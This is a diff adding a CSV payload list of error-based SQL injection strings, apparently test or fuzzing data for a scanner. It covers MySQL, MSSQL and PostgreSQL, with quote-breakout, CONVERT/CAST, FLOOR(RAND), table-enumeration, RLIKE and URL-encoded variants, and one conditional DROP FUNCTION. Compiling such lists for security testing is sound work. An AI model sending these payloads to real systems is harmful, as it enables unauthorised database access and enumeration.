@@ -1,0 +1,22 @@
+technique,payload,label,pair,max_columns,sentinel_literal,notes
+error,' AND MID(VERSION(),1,1) = '5';,,,,,Check MySQL version; aims to trigger DB syntax error
+error,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))",,,,,Error-based conversion; aims to trigger DB syntax error
+error,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))",,,,,Error-based conversion 2 chars; aims to trigger DB syntax error
+error,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))",,,,,Error-based conversion 3 chars; aims to trigger DB syntax error
+error,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))",,,,,Error-based INJECT; aims to trigger DB syntax error
+error,"AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",,,,,Error-based with CASE WHEN; aims to trigger DB syntax error
+error,"AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)",,,,,PostgreSQL error-based; aims to trigger DB syntax error
+error,"AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",,,,,MySQL error-based with FLOOR; aims to trigger DB syntax error
+error,' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,,,,,MSSQL table enumeration; aims to trigger DB syntax error
+error,"RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",,,,,Error-based RLIKE true; aims to trigger DB syntax error
+error,"RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",,,,,Error-based RLIKE false; aims to trigger DB syntax error
+error,IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,,,,,Error-based conditional; aims to trigger DB syntax error
+error,IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,,,,,Error-based conditional true; aims to trigger DB syntax error
+error,',,,,,Single quote; aims to trigger DB syntax error
+error,')--,,,,,Closing parenthesis; aims to trigger DB syntax error
+error,""" )--",,,,,Double quote closing parenthesis; aims to trigger DB syntax error
+error,'; --,,,,,Semicolon comment; aims to trigger DB syntax error
+error,'||'x'='x,,,,,String concatenation; aims to trigger DB syntax error
+error,%27%29--,,,,,URL encoded closing paren; aims to trigger DB syntax error
+error,%27%3B%20--,,,,,URL encoded semicolon; aims to trigger DB syntax error
+error,%2527%2529--,,,,,Double URL encoded; aims to trigger DB syntax error
